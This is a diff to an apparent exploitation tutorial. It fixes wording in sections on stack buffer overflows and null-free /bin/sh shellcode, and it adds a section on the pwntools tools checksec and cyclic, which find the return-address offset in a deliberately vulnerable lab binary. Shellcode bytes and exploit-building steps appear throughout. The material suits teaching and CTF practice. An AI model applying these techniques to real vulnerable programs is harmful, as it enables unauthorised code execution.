@@ -89,7 +89,7 @@ Again, you have a shell, or if this program would be with SUID bit set, you woul
 
 ### Why is this happening?
 
-Programming languages such as C, in which the High-level language instructions map to typical machine language do not provide any mechanism to identify if the buffer (char array) declared on to the stack, can take the input more than was it was supposed to take. The reason for non-checking such sort of mechanism was to achieve speed part of the machine language.
+Programming languages such as C, in which the High-level language instructions map to typical machine language do not provide any mechanism to identify if the buffer (char array) declared on to the stack, can take the input more than was it was supposed to take. The reason for non-checking such sort of mechanism was to achieve the speed part of the machine language.
 
 Stack overflow things:
 
@@ -255,7 +255,7 @@ void main(){
 }
 ```
 
-If you try to compile and execute it, you will end up with a shellcode length of 1 bytes, which is not the true length of the shellcode. Why? The reason is that the shellcode is dirty, not injectable. When you enter shellcode into a vulnerable program, the program prevents you from entering the complete shellcode because it stops accepting characters when it finds a null byte.
+If you try to compile and execute it, you will end up with a shellcode length of 1 byte, which is not the true length of the shellcode. Why? The reason is that the shellcode is dirty, not injectable. When you enter a shellcode into a vulnerable program, the program prevents you from entering the complete shellcode because it stops accepting characters when it finds a null byte.
 
 ### Clean up the assembly to make it smaller and injectable
 
@@ -263,7 +263,7 @@ The reason that the shellcode is not injectable is that we have `push 0x68732f00
 
 1. If you need to fill the register with zero value just don't do `mov` instruction and do `xor` on the register.
 
-2. If you need to place a small value in the register don't use the EAX name of the register use `al` which is 8 bits size or 1 byte.
+2. If you need to place a small value in the register don't use the EAX name of the register using `al` which is 8 bits size or 1 byte.
 
 3. Replace '/bin/sh\0' string with '/bin//sh' and terminate it with null in the stack.
 
@@ -283,7 +283,7 @@ So, clean shellcode will be the following:
   mov ebx, esp
 ; push zero
   push eax
-; push address of the string
+; push the address of the string
   push ebx
 ; move the second argument (argv array) to ecx
   mov ecx, esp
@@ -641,3 +641,51 @@ $ python3 assembly.py
 
 b'1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
 ```
+
+### Tools that come with pwntools
+
+#### checksec
+
+It allows you to see the security techniques used in the binary.
+
+For instance, our `stack-overflow` program has these techniques:
+```bash
+$ checksec stack-overflow
+[*] '/home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+#### cyclic
+
+This tool is beautiful for determining the offset before the return address. Let's try to determine the offset with it in `stack-overflow` binary.
+
+It generates a string with a set of unique patterns. 500 here is the length of the output string.
+```bash
+$ cyclic 500
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+```
+
+Now, take the output and place it in gdb.
+```bash
+gef➤  r
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61716361 in ?? ()
+```
+
+You got the address `0x61716361`. Next, use it to determine the offset.
+```bash
+$ cyclic -l 0x61716361
+262
+```
+
+Thus, you determined the offset.
+
+It has also implementation in python programming as `cyclic(500)` and `cyclic_find(0x61716361)`.
